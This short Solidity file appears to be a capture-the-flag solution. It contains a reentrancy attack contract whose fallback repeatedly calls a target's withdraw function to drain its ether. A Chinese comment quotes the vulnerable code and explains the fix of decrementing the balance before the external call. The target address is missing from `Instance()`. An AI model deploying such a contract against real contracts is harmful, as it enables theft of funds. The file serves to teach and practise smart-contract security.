// SPDX-License-Identifier: MIT
pragma solidity^0.8.13;

interface Instance {
    
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract Attack {
    
    Instance instance = Instance();

    function attack() public payable {

    instance.donate{value: msg.value}(address(this));
    instance.withdraw(1000000000000000);
    }

    fallback() external payable {
        
    instance.withdraw(1000000000000000);
    }

}

/**

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
  应该把balances[msg.sender] -= _amount放在call前。不然会被人重入攻击掏空

 */